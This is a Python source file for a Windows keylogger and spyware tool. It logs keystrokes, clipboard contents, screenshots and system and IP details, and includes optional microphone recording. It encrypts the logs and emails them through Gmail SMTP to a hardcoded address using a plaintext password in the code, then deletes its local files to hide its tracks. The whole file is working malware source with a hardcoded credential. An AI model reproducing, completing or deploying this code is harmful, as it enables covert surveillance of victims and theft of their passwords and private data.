#imported libraries

#keystrokes by pynput lib

from pynput.keyboard import Key, Listener

#email libraries

import smtplib
from email.mime.multipart import  MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#getpass info to get the username and request libs

from requests import get

#collecting computer info

import socket
import platform

#clipboard

import win32clipboard

#for microphone

from scipy.io.wavfile import write
import sounddevice as sd

#for screenshots

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

#system info to track time

import time
import os

#encrypt the file using cryptography lib

from cryptography.fernet import Fernet

#---------------------------------------------------
#Code part

#1. Keylooger

#append all the keys logged to a file
keys_info = "key_log.txt"
system_information = "sys_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "auido.wav"
screenshot_info = "screenshot.png"

keys_info_e = "e_key_log.txt"
system_information_e = "e_sys_info.txt"
clipboard_info_e = "e_clipboard.txt"

microphone_time = 10
time_iteration = 15
no_of_iteration_end = 3

email_address = "ytparty31@gmail.com"
toaddr = "ytparty31@gmail.com"

key = "1lk8ktjhT5YEPccna6wHwtT_aKXu0sEchAdbTlncYmw="

#file path for key_log.txt
file_path = "D:\\Programming\\Projects\\Python\\Cybersecurity\\Keylogger_adv\\Project"

#access the file
extend = "\\"
file_merge = file_path + extend

#2. Email functionalities
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    
    msg = MIMEMultipart()
    
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body of the mail"
    
    msg.attach(MIMEText(body,'plain'))
    
    filename = filename
    attachment =open(attachment, 'rb')
    
    p = MIMEBase('appliaction', 'octet-stream')
    
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()

    s.login(fromaddr, "Abhishek353535")

    text = msg.as_string()
    
    s.sendmail(fromaddr, toaddr, text)

    s.quit()

send_email(keys_info, file_path + extend + keys_info, toaddr)

#System Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor Info: " + (platform.processor()) + '\n')
        f.write("System Info: " + (platform.system()) + " " + (platform.version()) + '\n')
        f.write("Machine Info: " + (platform.machine()) + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP: " + IPAddr + '\n')
        # to get the public IP address
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)")

computer_information()

#Clipboard functions
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            f.write("Clipboard Data: \n" + pasted_data)
            
        except:
            f.write("Clipboard could not be copied")

copy_clipboard()

#microphone recording
def microphone():
    fs = 44100          #frequency
    sec = microphone_time

    myrecording = sd.rec(int(sec * fs), samplerate=fs, channels=2)
    sd.wait()
    
    write(file_path + extend + audio_info, fs, myrecording)

#microphone()

#Screenshot function
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)

screenshot()

#Timer Functions
no_of_iteration = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
while no_of_iteration < no_of_iteration_end:
    #below code is for keylogger and written under while loop for iterating it
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            #modification to make the file easily readable
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    #exit out of keylogger
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    #open the listerner block
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_info, file_path + extend + screenshot_info, toaddr)

        copy_clipboard()

        no_of_iteration += 1

        currentTime =time.time()
        stoppingTime = time.time() + time_iteration

#Encrypt the files
files_to_encrypt = [file_merge + keys_info, file_merge + clipboard_info, file_merge + system_information]
encrypted_file_names = [file_merge + keys_info_e,file_merge + clipboard_info_e,file_merge + system_information_e]

counter = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[counter], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[counter], 'wb') as f:
        f.write(encrypted)
        
    send_email(encrypted_file_names[counter], encrypted_file_names[counter], toaddr)
    counter += 1

time.sleep(120)

#clean up tracks and delete files
deleted_files = [system_information, clipboard_info, keys_info, screenshot_info, audio_info]
for file in deleted_files:
    os.remove(file_merge + file)
